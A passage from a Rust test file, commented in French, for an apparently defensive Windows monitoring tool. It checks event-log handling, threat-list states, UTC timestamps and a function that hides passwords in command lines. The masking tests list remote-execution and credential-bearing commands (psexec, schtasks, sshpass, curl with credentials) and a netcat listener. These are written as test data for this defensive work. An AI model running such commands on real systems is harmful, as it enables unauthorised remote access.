        ("collectes::desactivee(Collecte::AuditDonnees, \"mode console", "audit en console"),
        ("crate::capture::demarrer(\"trafic\", Collecte::CaptureTrafic,", "capture du trafic"),
        ("crate::capture::demarrer(\"réseau local\", Collecte::CaptureReseauLocal,", "capture du réseau local"),
        ("collectes::desactivee(c, \"mode console : capture", "capture en console"),
        ("} else if i.dns_lu && !i.preexistant {", "IP directe selon le journal DNS lu (score_flux)"),
        ("                dns_lu,
                preexistant: self.preexistants.contains(&cle),", "état lu du journal DNS passé à score_flux"),
        ("let dns_lu = collectes::lue_recemment(Collecte::JournalDns);", "lecture récente du journal DNS"),
    ] {
        assert!(n.contains(motif), "moniteur : {quoi}");
    }
    assert!(!n.contains("self.journal_dns_actif"), "IP directe : plus l'état de départ du journal DNS");
    let c = include_str!("capture.rs").replace("\r\n", "\n");
    assert!(c.contains("crate::collectes::echec(collecte, \"aucune interface réseau à écouter\");"));
    assert!(c.contains("crate::collectes::echec(collecte, &format!(\"ouverture de la capture impossible"));
    assert_eq!(c.matches("crate::collectes::succes(collecte);").count(), 2, "capture : ouverture et tic");
    let v = include_str!("vol_donnees.rs").replace("\r\n", "\n");
    assert!(v.contains("echecs += 1;") && v.contains("crate::collectes::noter_comptes(crate::collectes::Collecte::AuditDonnees, n, echecs,"));
    assert!(v.contains("crate::collectes::echec(crate::collectes::Collecte::AuditDonnees, \"dossier des profils illisible\");"), "audit : profils illisibles pris pour « rien à auditer »");
    assert!(include_str!("surveillances.rs").contains("Err(_) => crate::collectes::echec(crate::collectes::Collecte::Peripheriques,"));
    assert!(include_str!("parefeu.rs").contains("crate::collectes::echec(crate::collectes::Collecte::PaquetsParefeu, \"pfirewall.log absent ou illisible\");"));
    assert!(include_str!("hygiene.rs").contains("Err(_) => crate::collectes::echec(crate::collectes::Collecte::Extensions,"));
    let na = include_str!("natif.rs").replace("\r\n", "\n");
    assert!(na.contains("else { return Err(\"instantané des processus impossible\".into()) };") && na.contains("if !premier {\n            return Err("));
    let e = include_str!("evenements.rs").replace("\r\n", "\n");
    assert!(e.contains("let (suivant, b, sautes) = apres_blocage(dernier, lu_jusqu_a, fin, lecture, blocage);"), "abonner : blocage non traité");
    assert!(e.contains("Some(Lecture::Delai) => collectes::partielle(collecte,"), "abonner : lecture lente non notée");
    assert!(e.contains("Some(Lecture::Delai) if b.sans_progres >= LIMITE_BLOCAGE => {\n                        collectes::echec(collecte,"), "abonner : délais sans progrès restés « Partielle »");
    assert!(e.contains("let fin = fenetre(dernier, n);") && e.contains("(EventRecordID <= {fin})"), "abonner : lecture non bornée");
    // Rotation vérifiée à chaque tour qui a du nouveau (relecture de la PR 3.3c, D1 ; audit S78-02), sans condition
    let r = e.find("if let Some((reprise, perdus)) = plus_ancien_numero(&canal).and_then(|a| perte_rotation(dernier, a)) {").expect("abonner : rotation non vérifiée");
    // Les quatre lignes qui précèdent (découpage sur des fins de ligne : aucun risque de couper un caractère accentué)
    let avant = &e[..r];
    let debut_bloc = avant.rmatch_indices('\n').nth(4).map_or(0, |(i, _)| i);
    assert!(!avant[debut_bloc..].contains("if n - dernier > FENETRE"), "abonner : rotation vérifiée seulement en cas de retard");
    // PR 3.3d (S78-06, S78-07) : vérifiée avant chaque fenêtre, dans la boucle ; reprise bornée par n
    assert!(avant.rfind("let lecture = loop {").is_some_and(|l| avant[l..].matches('\n').count() < 6), "abonner : rotation vérifiée une seule fois par tour");
    // Découpes sur des fins de ligne (aucun risque de couper un caractère accentué)
    let lignes_apres = |d: usize, k: usize| { let s = &e[d..]; let f = s.match_indices('\n').nth(k).map_or(s.len(), |(i, _)| i); &s[..f] };
    assert!(lignes_apres(r, 3).contains("let reprise = reprise.min(n);"), "abonner : reprise après rotation non bornée par n");
    // S78-05 : coupure retenue seulement après une coupure réussie, oubliée dès que le journal est revu actif
    let a = e.find("pub fn activer_journal(").unwrap();
    let af = lignes_apres(a, 25);
    // Retenue avant wevtutil (relecture de #79, D1), retirée si la coupure échoue (audit S78-05)
    assert!(af.find("c.push(canal.to_string());").unwrap() < af.find("let ok = Command::new(\"wevtutil\")").unwrap(), "activer_journal : coupure retenue après wevtutil (course avec le fil de suivi)");
    assert!(af.contains("if actif == ok {\n        // Réactivé, ou coupure refusée : plus rien à retenir\n        oublier_coupe(canal);"), "activer_journal : coupure refusée encore retenue");
    assert!(e.contains("if etat_canal == Some(true) {\n                    oublier_coupe(&canal);"), "abonner : coupure retenue après une réactivation par un autre moyen");
    assert!(e.contains("if !encore_une_fenetre(lecture, dernier, n, debut.elapsed()) {\n                    break lecture;"), "abonner : une seule fenêtre par tour (débit plafonné)");
    // Journal coupé par le retour arrière de la baseline : ni réactivé, ni noté en échec
    assert!(e.contains("let coupe = desactive && coupe_par_le_service(&canal);") && e.contains("if a_reactiver(&canal) && !coupe && !desactivation_signalee {"), "abonner : coupure de la baseline annulée");
    assert!(e.contains("if coupe {\n                    collectes::desactivee(collecte,"), "abonner : coupure de la baseline notée en échec");
    assert!(af.contains("if !actif {\n        let mut c = COUPES_PAR_LE_SERVICE.lock()"), "activer_journal : coupure du service non retenue");
    assert!(e.contains("let etat_canal = canal_actif(&canal);\n            let desactive = etat_canal == Some(false);") && e.contains("if desactive && !reactive {\n                    collectes::echec(collecte,"), "abonner : journal désactivé non noté");
    assert!(e.contains("if a_reactiver(&canal) && !coupe && !desactivation_signalee {\n                    reactive = activer_journal(&canal, true);"), "abonner : journal DNS non réactivé (D4)");
    assert!(n.contains("journal_dns_actif: collectes::lue_recemment(Collecte::JournalDns),"), "interface et indice : même état du journal DNS");
    assert!(e.contains("Some((t, n)) if t.elapsed().as_secs() < 3600 => {\n            collectes::partielle(collecte,"), "saut d'événements : collecte redevenue active aussitôt");
    assert!(n.contains("let dns_lu = collectes::lue_recemment(Collecte::JournalDns);"), "IP directe : un échec passager du journal DNS la retire");
}

/// Phase 3.3 : lecture d'un journal suivi interrompue : les événements non lus sont relus au tour suivant (aucune perte),
/// à partir du dernier traité (aucun doublon) ; lecture complète : on avance au dernier numéro
#[test]
fn phase3_journal_interrompu_relu() {
    use crate::evenements::prochain_dernier;
    assert_eq!(prochain_dernier(10, 20, true, Some(15)), 20);
    assert_eq!(prochain_dernier(10, 20, true, None), 20);
    assert_eq!(prochain_dernier(10, 20, false, None), 10);
    assert_eq!(prochain_dernier(10, 20, false, Some(15)), 15);
    // Numéro aberrant : borné à l'intervalle demandé
    assert_eq!(prochain_dernier(10, 20, false, Some(99)), 20);
    assert_eq!(prochain_dernier(10, 20, false, Some(3)), 10);
    // PR 3.3d (S78-07) : `dernier` au-delà de `n` (journal recommencé entre deux lectures) : aucune panique, pas de recul
    assert_eq!(prochain_dernier(30, 20, false, Some(25)), 30);
}

/// Phase 3.3 : listes de menaces : aucune source activée (réglage par défaut pour les domaines, toutes à licence
/// restreinte) : désactivée, pas indisponible ; des sources activées sans entrée : indisponible
#[test]
fn phase3_listes_desactivees_par_reglage() {
    use crate::collectes::{decision_listes, Note};
    assert_eq!(decision_listes(0, 0), Note::Desactivee);
    assert_eq!(decision_listes(0, 7), Note::Desactivee);
    assert_eq!(decision_listes(2, 0), Note::Indisponible);
    assert_eq!(decision_listes(2, 7), Note::Active);
}

/// Phase 3.3 : une liste LOLDrivers absente, illisible ou sans empreinte est indisponible (PIL-001 sans collecte), pas
/// « aucun pilote vulnérable » (décision exécutée ; son branchement dans liste_loldrivers : contrôle du source) ; des
/// listes de menaces activées mais vides sont indisponibles, des listes non activées désactivées
#[test]
fn phase3_loldrivers_vide_est_indisponible() {
    use crate::hygiene::empreintes_loldrivers;
    assert!(empreintes_loldrivers(None).is_err());
    assert!(empreintes_loldrivers(Some("[]")).is_err());
    assert!(empreintes_loldrivers(Some("pas du json")).is_err());
    let h = "ab".repeat(32);
    assert_eq!(empreintes_loldrivers(Some(&format!(r#"[{{"SHA256": "{}"}}]"#, h.to_uppercase()))).unwrap(), [h].into_iter().collect());
    let s = include_str!("hygiene.rs").replace("\r\n", "\n");
    let d = s.find("pub fn liste_loldrivers(").unwrap();
    let f = &s[d..d + s[d..].find("\n}\n").unwrap()];
    assert!(f.contains("Err(raison) => crate::collectes::echec(crate::collectes::Collecte::Loldrivers"), "échec LOLDrivers non noté");
    // Listes de menaces (ListesMenaces, ListesDomaines : notées par le seul fil des listes, absent des tests)
    use crate::collectes::{publier, noter_listes};
    noter_listes(2, 0, 1, 5);
    let p = publier();
    let etat = |id: &str| p.0.iter().find(|e| e.id == id).unwrap().etat.clone();
    assert_eq!((etat("ListesMenaces").as_str(), etat("ListesDomaines").as_str()), ("Indisponible", "Active"));
    noter_listes(2, 3, 1, 0);
    let p = publier();
    let etat = |id: &str| p.0.iter().find(|e| e.id == id).unwrap().etat.clone();
    assert_eq!((etat("ListesMenaces").as_str(), etat("ListesDomaines").as_str()), ("Active", "Indisponible"));
    noter_listes(2, 3, 0, 0);
    let p = publier();
    let etat = |id: &str| p.0.iter().find(|e| e.id == id).unwrap().etat.clone();
    assert_eq!(etat("ListesDomaines"), "Desactivee");
    assert!(p.1.contains(&"DNS-001".to_string()), "domaines désactivés : DNS-001 reste sans collecte");
}

/// Phase 3.3 : branchements (contrôle du source, ces appels Windows ne s'exécutent pas en test) : une table TCP
/// illisible est notée et n'est pas « aucune connexion » ; chaque lecture d'un journal suivi crédite sa collecte ;
/// la fin du flux WMI des processus le rend indisponible ; l'état de Defender illisible est noté
#[test]
fn phase3_branchements_des_collectes() {
    let natif = include_str!("natif.rs").replace("\r\n", "\n");
    let d = natif.find("fn lire_table(").unwrap();
    let f = &natif[d..d + natif[d..].find("\n}\n").unwrap()];
    assert!(f.contains("if r != 0 {\n            return Err("), "table TCP en échec non rendue");
    assert!(f.trim_end().ends_with("))"), "table qui grossit sans fin non rendue en échec");
    let m_crlf = include_str!("moniteur.rs").replace("\r\n", "\n");
    let m = m_crlf.as_str();
    assert!(m.contains("Err(e) => collectes::echec(Collecte::Connexions, &e),"), "échec de la table TCP non noté");
    assert!(m.contains("if etat.disponible {\n                        collectes::succes(Collecte::EtatDefender);\n                    } else {\n                        collectes::echec(Collecte::EtatDefender,"), "état de Defender : note inversée ou absente");
    assert!(m.contains("collectes::noter_listes(actives(\"IP\"), i.total_ip + i.total_reseaux, actives(\"Domaines\"), i.total_domaines);"));
    assert!(!m.contains("natif::lister_tcp()"), "le cycle doit lire la table avec son échec");
    assert!(m.contains("collectes::echec(Collecte::EtatDefender,"));
    assert!(m.contains("collectes::noter_listes("));
    assert!(m.contains("collectes::echec(Collecte::JournalDns, \"journal DNS-Client inactif"), "journal DNS impossible à activer non noté");
    assert!(include_str!("siem.rs").contains("crate::collectes::desactivee(c, \"mode console"), "journaux non lus en console non notés");
    let e = include_str!("evenements.rs").replace("\r\n", "\n");
    // Corps dans abonner_avec_priorite depuis A-8-1 (abonner n'en est que l'appel sans priorité)
    let d = e.find("pub fn abonner_avec_priorite(").unwrap();
    let f = &e[d..d + e[d..].find("\n}\n").unwrap()];
    assert_eq!(f.matches("collectes::echec(collecte,").count(), 5, "abonner : échec initial, numéro illisible, journal désactivé, délais sans progrès, événements illisibles");
    assert_eq!(f.matches("collectes::succes(collecte)").count(), 1, "abonner : départ (les autres succès passent par noter_lu)");
    assert_eq!(f.matches("noter(None, &blocage, &perte);").count(), 2, "abonner : première lecture après un départ illisible, rien de nouveau");
    assert!(f.contains("noter(Some(lecture), &blocage, &perte);") && f.contains("None | Some(Lecture::Complete) => noter_lu(collecte, perte),"), "abonner : événements lus non notés");
    assert_eq!(f.matches("return false").count(), 1, "abonner : seule une requête mal formée abandonne le suivi (pas un départ illisible)");
    assert!(f.contains("let Some(mut dernier) = depart else {"), "abonner : le fil doit chercher le dernier numéro quand le départ a échoué");
    // Le numéro de reprise est réécrit à chaque issue du tour (sinon tout le journal serait relu à chaque tour)
    assert!(f.contains("depart = Some(n);") && f.contains("noter(None, &blocage, &perte);\n                depart = Some(dernier);\n                continue;")
        && f.contains("noter(Some(lecture), &blocage, &perte);\n            depart = Some(dernier);") && f.contains("                dernier = suivant;\n"), "abonner : numéro de reprise non conservé");
    assert!(f.contains("let lecture = historique("), "succès noté avant la lecture des événements");
    assert!(f.contains("prochain_dernier(dernier, fin, lecture == Lecture::Complete, traite)") && !f.contains("dernier = n;"), "événements perdus après un échec");
    assert!(e.contains("return if fin_des_resultats(&e) {\n                Lecture::Complete\n            } else if (e.code().0 as u32) & 0xFFFF == 1460 {"), "vider : échec d'EvtNext pris pour la fin, ou délai pris pour une erreur");
    assert!(e.contains("Err(_) => None,"), "dernier_numero : échec pris pour un journal vide");
    for (nom, s, c) in [("defender", include_str!("defender.rs"), "JournalDefender"), ("parefeu", include_str!("parefeu.rs"), "JournalParefeu"),
                        ("vol_donnees", include_str!("vol_donnees.rs"), "JournalSecurite"), ("processus", include_str!("processus.rs"), "Sysmon"),
                        ("moniteur", m, "JournalDns")] {
        assert!(s.contains(&format!("Collecte::{c}, move |xml|")) || s.contains(&format!("Collecte::{c},\n")) || s.contains(&format!("Collecte::{c}, move"))
            || s.contains(&format!("Collecte::{c}, Some(crate::natif::Priorite::Haute), move |xml|")), "{nom} : collecte {c} non passée à abonner");
    }
    assert!(include_str!("siem.rs").contains(r#"("Security", securite, crate::collectes::Collecte::JournalSecurite), ("System", systeme, crate::collectes::Collecte::JournalSysteme)"#), "siem : journaux sans leur collecte");
    let p = include_str!("processus.rs");
    assert!(p.contains("collectes::desactivee(Collecte::Sysmon,"), "Sysmon absent non noté");
    assert!(p.contains("if evenements::journal_actif(JOURNAL_SYSMON) == Some(true) && evenements::lisible(JOURNAL_SYSMON) {"), "Sysmon illisible au démarrage : pas de repli sur WMI");
    assert!(p.contains("collectes::echec(Collecte::Sysmon,"), "Sysmon illisible non noté");
    assert!(p.contains("collectes::desactivee(Collecte::WmiProcessus,"), "WMI inutile (Sysmon lu) non noté");
    assert!(p.contains("collectes::partielle(Collecte::WmiProcessus,"), "WMI partielle non notée");
    let fin = p.find("// Flux terminé : plus aucune création de processus n'est vue").expect("fin du flux WMI non notée");
    assert!(p[fin..fin + 300].contains("collectes::echec(Collecte::WmiProcessus,"));
}

/// Phase 3.1 : une alerte d'un modèle plus récent (retour arrière) se lit, ses champs inconnus sont ignorés
#[test]
fn phase3_champs_inconnus_ignores() {
    use crate::commun::lire_alertes_texte;
    let (a, ecartees) = lire_alertes_texte(r#"[{"Id":"a","Modele":2,"Regle":"DEF-005","Collecte":"JournalDefender","ChampFutur":{"x":1}}]"#).unwrap();
    assert_eq!(ecartees, 0);
    assert!(a[0].modele == 2 && a[0].regle == "DEF-005" && a[0].collecte == "JournalDefender");
}

/// Phase 3.1 : toute nouvelle alerte porte le modèle actuel, posé à un seul endroit (ajouter_alerte_brute) ; une alerte
/// qui a déjà un modèle le garde
#[test]
fn phase3_nouvelle_alerte_porte_le_modele() {
    use crate::commun::{marquer_modele, Alerte, MODELE_ALERTE};
    assert_eq!(MODELE_ALERTE, 1);
    let mut a = Alerte::default();
    marquer_modele(&mut a);
    assert_eq!(a.modele, MODELE_ALERTE);
    let mut b = Alerte { modele: 2, ..Default::default() };
    marquer_modele(&mut b);
    assert_eq!(b.modele, 2);
    let source = include_str!("moniteur.rs");
    let debut = source.find("fn ajouter_alerte_brute").expect("ajouter_alerte_brute");
    assert!(source[debut..debut + 400].contains("commun::marquer_modele(&mut a)"), "ajouter_alerte_brute ne pose plus le modèle");
}

/// Phase 3.1 : le moniteur lit alertes.json par la lecture tolérante, plus par commun::lire (tout ou rien)
#[test]
fn phase3_moniteur_lit_les_alertes_par_element() {
    let source = include_str!("moniteur.rs");
    assert!(source.contains("alertes: commun::lire_alertes(),"), "chargement des alertes");
    assert!(!source.contains(concat!("commun::lire(\"alertes", ".json\")")), "lecture tout ou rien d'alertes.json");
}

// ------------------------------------------------------------ phase 4, PR 4.1 : ordre total, pertes du SIEM, réponses

/// D4-4 : heure UTC et numéro d'ordre. L'heure locale est ambiguë à l'heure répétée d'octobre (02:00 à 03:00 deux fois,
/// le 2026-10-25 en France) ; l'heure UTC ne l'est pas, et le numéro d'ordre départage deux éléments de la même seconde
#[test]
fn chronologie_ordre_utc_et_seq() {
    use crate::commun::{heure_utc_de, horodater};
    use std::time::{Duration, UNIX_EPOCH};
    assert_eq!(heure_utc_de(UNIX_EPOCH), "1970-01-01T00:00:00Z");
    assert_eq!(heure_utc_de(UNIX_EPOCH + Duration::from_secs(1_792_891_800)), "2026-10-25T01:30:00Z");
    assert_eq!(heure_utc_de(UNIX_EPOCH + Duration::from_secs(1_709_251_199)), "2024-02-29T23:59:59Z", "année bissextile");
    assert_eq!(heure_utc_de(UNIX_EPOCH + Duration::from_secs(951_868_800)), "2000-03-01T00:00:00Z", "an 2000 bissextile");
    assert_eq!(heure_utc_de(UNIX_EPOCH + Duration::from_secs(1_767_225_599)), "2025-12-31T23:59:59Z", "décembre");
    // Deux heures UTC distinctes d'une heure, pendant l'heure répétée : même heure locale, ordre UTC correct
    assert!(heure_utc_de(UNIX_EPOCH + Duration::from_secs(1_792_891_800)) < heure_utc_de(UNIX_EPOCH + Duration::from_secs(1_792_891_800 + 3600)));
    // Horodatage : numéros strictement croissants ; une valeur déjà posée n'est jamais remplacée
    let (mut h1, mut s1, mut h2, mut s2) = (String::new(), 0u64, String::new(), 0u64);
    horodater(&mut h1, &mut s1);
    horodater(&mut h2, &mut s2);
    assert!(s1 > 0 && s2 > s1, "{s1} {s2}");
    assert!(h1.ends_with('Z') && h1.len() == 20, "{h1}");
    let (mut h, mut s) = ("2026-10-25T01:30:00Z".to_string(), 7u64);
    horodater(&mut h, &mut s);
    assert_eq!((h.as_str(), s), ("2026-10-25T01:30:00Z", 7));
    // Une nouvelle alerte est horodatée ; une alerte d'avant la phase 4 se relit avec des champs vides, réécrits vides
    let mut a = crate::commun::Alerte::default();
    crate::commun::marquer_modele(&mut a);
    assert!(!a.heure_utc.is_empty() && a.seq > 0);
    // L'événement du SIEM tiré de l'alerte garde le même instant
    assert_eq!(crate::siem::evenement_de_alerte(&a).heure_utc, a.heure_utc);
    let json = serde_json::to_string(&a).unwrap();
    assert!(json.contains("\"HeureUtc\"") && json.contains("\"Seq\""), "{json}");
    let ancienne: crate::commun::Alerte = serde_json::from_str(r#"{"Id":"x","Heure":"2026-10-25 02:30:00","Niveau":"Alerte"}"#).unwrap();
    // Audit de #94, S94-02 : une alerte relue d'un fichier altéré est bornée, HeureUtc comprise
    let alteree = format!(r#"[{{"Id":"x","Niveau":"Alerte","HeureUtc":"{}","Raisons":"{}"}}]"#, "9".repeat(100_000), "r".repeat(100_000));
    let (lues, ecartees) = crate::commun::lire_alertes_texte(&alteree).unwrap();
    assert_eq!(ecartees, 0);
    assert!(lues[0].heure_utc.chars().count() <= 40 && lues[0].raisons.chars().count() < 100_000, "relue bornée");
    assert!(ancienne.heure_utc.is_empty() && ancienne.seq == 0);
    let json = serde_json::to_string(&ancienne).unwrap();
    assert!(!json.contains("HeureUtc") && !json.contains("\"Seq\""), "champs absents non écrits : {json}");
}

/// File du SIEM pleine : chaque événement perdu est compté (avant : perte silencieuse)
#[test]
fn siem_pertes_comptees() {
    let (tx, _rx) = std::sync::mpsc::sync_channel::<crate::siem::Evenement>(1);
    let avant = crate::siem::pertes();
    crate::siem::deposer(&tx, crate::siem::Evenement::default());
    assert_eq!(crate::siem::pertes(), avant, "place libre : rien de perdu");
    crate::siem::deposer(&tx, crate::siem::Evenement::default());
    crate::siem::deposer(&tx, crate::siem::Evenement::default());
    assert!(crate::siem::pertes() >= avant + 2, "deux pertes comptées");
    // Ligne de journal à la 1re, 10e, 100e… perte seulement
    use crate::siem::puissance_de_dix;
    assert!([1, 10, 100, 1000, 10_000_000].iter().all(|&n| puissance_de_dix(n)));
    assert!([0, 2, 11, 110, 111, 101, 20, 1001].iter().all(|&n| !puissance_de_dix(n)));
}

/// Audit du 2026-11-23, A-6-1 : lignes de commande portant un secret ; la valeur secrète n'est plus dans le résultat, le
/// reste de la ligne (programme, options, compte) est gardé
#[test]
fn masquer_secrets_retire_les_valeurs() {
    use crate::commun::masquer_secrets;
    let cas: &[(&str, &str, &str)] = &[
        (r"net use \\srv\c$ Secr3tNet /user:POSTE\admin", "Secr3tNet", r"/user:POSTE\admin"),
        (r"net use Z: \\srv\partage /user:dom\u Secr3tApres /persistent:no", "Secr3tApres", "/persistent:no"),
        (r#"schtasks /create /tn maj /tr "c:\x.exe" /ru admin /rp Secr3tTache"#, "Secr3tTache", "/ru admin"),
        ("schtasks /create /s srv /u admin /p Secr3tP /tn t", "Secr3tP", "/u admin"),
        ("cmdkey /add:srv /user:admin /pass:Secr3tCmdkey", "Secr3tCmdkey", "/user:admin"),
        ("psexec \\\\srv -u admin -p Secr3tPsexec cmd", "Secr3tPsexec", "-u admin"),
        ("mysql --password=Secr3tEgal -h db", "Secr3tEgal", "-h db"),
        ("outil --password Secr3tEspace --verbose", "Secr3tEspace", "--verbose"),
        ("New-LocalUser -Name x -Password Secr3tPs", "Secr3tPs", "-Name x"),
        (r#"powershell -c "$s = ConvertTo-SecureString 'Secr3t Guillemets' -AsPlainText -Force""#, "Guillemets", "-AsPlainText"),
        ("ConvertTo-SecureString -String Secr3tString -AsPlainText -Force", "Secr3tString", "-AsPlainText"),
        ("Invoke-Command -ComputerName srv -Credential Secr3tCred -ScriptBlock {}", "Secr3tCred", "-ComputerName srv"),
        ("mstsc /v:srv /p:Secr3tDeuxPoints", "Secr3tDeuxPoints", "/v:srv"),
        ("outil /password:Secr3tLong /x", "Secr3tLong", "/x"),
        (r#"curl https://admin:Secr3tUrl@exemple.test/chemin"#, "Secr3tUrl", "https://admin:"),
        (r#"outil -Password "Secr3t avec espaces" -Force"#, "avec espaces", "-Force"),
        ("ROBOCOPY a b & net use * \\\\srv\\c Secr3tSuite", "Secr3tSuite", "ROBOCOPY a b"),
        // Revue de #269 : formes ajoutées
        ("plink -ssh admin@srv -pw Secr3tPlink -batch", "Secr3tPlink", "-batch"),
        (r"C:\Outils\pscp.exe -pw Secr3tPscp f.txt admin@srv:/tmp", "Secr3tPscp", "f.txt"),
        ("mysql -u root -pSecr3tColle base", "Secr3tColle", "-u root"),
        ("mysqldump --user=root --password=Secr3tDump base", "Secr3tDump", "--user=root"),
        ("cmd /c set PGPASSWORD=Secr3tPg&& psql -U postgres", "Secr3tPg", "psql -U postgres"),
        ("PGPASSWORD=Secr3tPg2 psql -h db", "Secr3tPg2", "psql -h db"),
        ("sqlcmd -S srv -U sa -P Secr3tSql -Q x", "Secr3tSql", "-U sa"),
        ("sqlcmd -S srv -U sa -PSecr3tSqlColle", "Secr3tSqlColle", "-U sa"),
        ("curl -u admin:Secr3tCurl https://exemple.test/", "Secr3tCurl", "-u admin:"),
        ("curl.exe -uadmin:Secr3tCurlColle https://exemple.test/", "Secr3tCurlColle", "-uadmin:"),
        ("wget --password=Secr3tWget https://exemple.test/f", "Secr3tWget", "https://exemple.test/f"),
        ("wget --http-password=Secr3tHttp https://exemple.test/f", "Secr3tHttp", "wget"),
        ("7z a -pSecr3t7z -mhe=on a.7z dossier", "Secr3t7z", "-mhe=on"),
        ("rar a -pSecr3tRar a.rar dossier", "Secr3tRar", "a.rar"),
        ("unzip -P Secr3tUnzip a.zip", "Secr3tUnzip", "a.zip"),
        ("zip -P Secr3tZip a.zip f", "Secr3tZip", "a.zip"),
        ("openssl enc -aes-256-cbc -in a -out b -pass pass:Secr3tSsl", "Secr3tSsl", "-out b"),
        ("sshpass -p Secr3tSshpass ssh -p 22 admin@srv", "Secr3tSshpass", "ssh -p 22"),
        ("smbclient //srv/c -U admin%Secr3tSmb", "Secr3tSmb", "-U admin%"),
        ("gpresult /s srv /u admin /p Secr3tGp /r", "Secr3tGp", "/u admin"),
        ("wmic /node:srv /user:admin /password:Secr3tWmic process list", "Secr3tWmic", "process list"),
        // Revue de #269, D2 : la valeur d'une option qui porte le nom d'un outil ne change pas l'outil courant
        ("schtasks /create /tn T /tr cmd.exe /s srv /u admin /p Sonde1 /f", "Sonde1", "/tr cmd.exe"),
        ("schtasks /create /tn T /tr powershell.exe /s srv /u admin /p Sonde2", "Sonde2", "/tr powershell.exe"),
        ("schtasks /s srv /u admin /p Sonde6 /create /tn T /tr cmd.exe", "Sonde6", "/tr cmd.exe"),
        ("schtasks /create /tn ssh /tr del /s srv /u admin /p Sonde3", "Sonde3", "/tn ssh /tr del"),
        ("schtasks /create /tn xcopy /tr xcopy /ru admin /rp Sonde4", "Sonde4", "/tn xcopy"),
        ("mysql -u ssh -pSonde7 base", "Sonde7", "-u ssh"),
        ("plink -l del -pw Sonde10 srv", "Sonde10", "-l del"),
        ("cmd /c schtasks /create /tn T /tr del /s srv /u a /p Sonde8", "Sonde8", "cmd /c schtasks"),
        (r#"psexec \\srv -u admin -p Sonde5 xcopy a b /p"#, "Sonde5", "xcopy a b /p"),
        // Message d'un 4688 et raisons d'une alerte : la ligne suit « : »
        ("schtasks.exe lancé par cmd.exe : schtasks /create /tn T /tr cmd.exe /s srv /u admin /p Sonde9", "Sonde9", "lancé par cmd.exe"),
        ("tâche planifiée créée à distance : schtasks /create /tn T /tr del /s srv /u admin /p Sonde11", "Sonde11", "/tr del"),
        // Revue de #269, D3 : séparateur collé, lanceurs (start, call, psexec et ses drapeaux), échappement ^, @ de tête,
        // deux-points collé ; un outil à secret est reconnu sur n'importe quel mot, puis verrouillé jusqu'au séparateur
        ("cmd /c echo x&&schtasks /s srv /u admin /p S15", "S15", "echo x&&schtasks"),
        ("echo x|schtasks /s srv /u admin /p S20", "S20", "echo x|schtasks"),
        ("start /b schtasks /create /tn T /tr cmd.exe /s srv /u admin /p S11", "S11", "start /b schtasks"),
        ("start /min /wait schtasks /s srv /u admin /p S12", "S12", "/min /wait"),
        ("call schtasks /s srv /u admin /p S04", "S04", "call schtasks"),
        ("sch^tasks /s srv /u admin /p S05", "S05", "sch^tasks"),
        ("@schtasks /s srv /u admin /p S24", "S24", "@schtasks"),
        (r"psexec \\srv -u admin -p S13 -d schtasks /s srv2 /u admin /p S14", "S13", "-d schtasks"),
        (r"psexec \\srv -u admin -p S13 -d schtasks /s srv2 /u admin /p S14", "S14", "/u admin"),
        ("Processus créé: schtasks /create /tn T /tr cmd.exe /s srv /u admin /p S18", "S18", "Processus créé:"),
        // Verrou : « sauvegarde: » remet la tête de commande à zéro, schtasks garde ses options jusqu'au séparateur
        ("schtasks /create /tn sauvegarde: /tr del /s srv /u admin /p S19", "S19", "/tn sauvegarde:"),
        // Start-Process et saps : les arguments cités (chaîne ou tableau) sont lus comme les options de l'outil lancé
        ("Start-Process schtasks -ArgumentList '/s srv /u admin /p S30'", "S30", "-ArgumentList '/s srv /u admin /p "),
        (r#"Start-Process schtasks -ArgumentList "/s srv /u admin /p S31" -Wait"#, "S31", "-Wait"),
        ("Start-Process schtasks -ArgumentList @('/s','srv','/u','admin','/p','S32')", "S32", "@('/s','srv','/u','admin','/p','***')"),
        ("saps schtasks -ArgumentList @('/p', 'S33')", "S33", "@('/p', '***')"),
        ("start-process -FilePath schtasks.exe -ArgumentList '/create','/s','srv','/p','S34' -WindowStyle Hidden", "S34", "-WindowStyle Hidden"),
        (r#"powershell -c "Start-Process schtasks -ArgumentList '/p S35'""#, "S35", "Start-Process schtasks"),
        // Virgule dans un mot nu : jamais un séparateur (le mot de passe entier est masqué)
        ("schtasks /s srv /u admin /p pa,S36ss /f", "S36", "/p *** /f"),
    ];
    for (ligne, secret, garde) in cas {
        let m = masquer_secrets(ligne);
        assert!(!m.contains(secret), "secret encore présent : {ligne} → {m}");
        assert!(m.contains(garde), "contexte perdu : {ligne} → {m}");
        assert!(m.contains(crate::commun::MASQUE), "{m}");
        assert_eq!(masquer_secrets(&m), m, "masquage stable : {m}");
    }
    // Lignes ordinaires : inchangées
    for ligne in [r#""C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel=1234 -parentBuildID 2026"#,
                  r"C:\Windows\system32\svchost.exe -k netsvcs -s Schedule",
                  "net use", r"net use Z: \\srv\partage /persistent:yes", "runas /savecred /user:admin cmd.exe",
                  r#"powershell -NoProfile -Command "Get-ChildItem 'C:\Users' -Recurse""#, "https://exemple.test/a@b",
                  // Revue de #269 : /p drapeau sans valeur, -p ou -P port ; mysql -p seul demande le mot de passe
                  "xcopy a b /p", "del /p x.txt", "findstr /p motif fichier.txt", "robocopy a b /e /mir",
                  "ssh -p 22 hote", "scp -P 2222 f h:", "nc -p 4444 -l", "mysql -p base", "7z x -p archive.7z",
                  "curl -u admin https://exemple.test/", "tasklist /v", "xcopy a b /p & ssh -p 22 hote",
                  // Lanceurs : la commande lancée devient l'outil courant
                  "cmd /c xcopy a b /p", "cmd.exe /k del /p x.txt", r#"start "" ssh -p 22 hote"#,
                  r#"psexec \\srv cmd /c del /p x.txt"#, "powershell -c ssh -p 22 hote", "sshpass -f fichier ssh -p 22 hote",
                  "cmd /c echo x&&ssh -p 22 hote", "start /min /wait ssh -p 22 hote", r"psexec \\srv -accepteula -d ssh -p 22 hote",
                  "call xcopy a b /p", "echo a|findstr /p motif",
                  "Start-Process ssh -ArgumentList '-p 22 hote'", "Start-Process notepad -ArgumentList 'a.txt' -WindowStyle Hidden",
                  "Start-Process xcopy -ArgumentList @('a','b','/p')", "outil /x pa,ss"] {
        assert_eq!(masquer_secrets(ligne), ligne);
    }
    // Non ASCII : le reste intact, le secret retiré
    let m = masquer_secrets("outil-été /pass:Mötdepässe日本 «fin» \u{1F600}");
    assert!(!m.contains("Mötdepässe") && m.contains("outil-été") && m.contains("«fin» \u{1F600}"), "{m}");
    // Règle 4 : jamais de panique, quelle que soit l'entrée
    torturer_texte("net use \\\\s\\c x /user:a -p 'b c' --password=d https://u:p@h", &mut |s| {
